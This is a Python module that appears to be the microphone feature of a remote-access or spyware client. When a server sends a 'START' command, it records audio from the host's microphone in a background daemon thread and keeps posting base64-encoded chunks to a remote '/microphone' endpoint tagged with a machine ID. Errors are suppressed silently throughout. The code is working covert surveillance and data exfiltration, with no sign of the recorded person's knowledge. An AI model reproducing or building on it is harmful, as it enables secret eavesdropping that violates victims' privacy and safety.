import threading
import time
import base64
import pyaudio
from features.curlmanager import CurlManager

class MicrophoneStreamer:    
    def __init__(self, cfc_instance):
        self.microphone_streaming = False
        self.microphone_thread = None
        self.cfc_instance = cfc_instance
        
        self.CHUNK = 1024
        self.FORMAT = pyaudio.paInt16
        self.CHANNELS = 1
        self.RATE = 44100
        self.last_sent_time = 0.0
    
    def microphone_worker(self):
        p = pyaudio.PyAudio()
        stream = None
        
        try:
            stream = p.open(format=self.FORMAT,
                            channels=self.CHANNELS,
                            rate=self.RATE,
                            input=True,
                            frames_per_buffer=self.CHUNK)
            
            curl = CurlManager()
            curl.set_headers(self.cfc_instance.headers)
            
            self.last_sent_time = time.time()
            while self.microphone_streaming:
                try:
                    try:
                        audio_data = stream.read(self.CHUNK)
                    except Exception as e:
                        print(f"Audio buffer overflow or read error: {e}")
                        time.sleep(0.01)
                        continue
                    
                    audio_base64 = base64.b64encode(audio_data).decode('utf-8')
                    
                    if self.microphone_streaming:
                        try:
                            url = f"{self.cfc_instance.base_url}/microphone?pc_id={self.cfc_instance.client_data['pc_id']}"
                            data = {"data": audio_base64}
                            code, body = curl.post(url=url, json=data)
                            if code == 200:
                                self.last_sent_time = time.time()
                                continue
                        except Exception as e:
                            break

                    if (time.time() - self.last_sent_time) > 60:
                        break
                        
                    time.sleep(1)
                    
                except Exception as e:
                    break
                    
        except Exception as e:
            pass
        finally:
            try:
                if stream:
                    stream.stop_stream()
                    stream.close()
            except:
                pass
            p.terminate()
    
    def handle_microphone(self, data):
        try:
            command = data.get("command")          
            if command.upper() == "STOP":
                self.microphone_streaming = False
                if self.microphone_thread and self.microphone_thread.is_alive():
                    self.microphone_thread.join(timeout=2)
                    try:
                        curl = CurlManager()
                        curl.set_headers(self.cfc_instance.headers)
                        stop_data = {"data": "stopped"}
                        url = f"{self.cfc_instance.base_url}/microphone?pc_id={self.cfc_instance.client_data['pc_id']}"
                        curl.post(url=url, json=stop_data)
                    except Exception as e:
                        pass
                    return
            elif command.upper() == "START":
                if not self.microphone_streaming:
                    self.microphone_streaming = True
                    self.microphone_thread = threading.Thread(target=self.microphone_worker)
                    self.microphone_thread.daemon = True
                    self.microphone_thread.start()
        except Exception as e:
            pass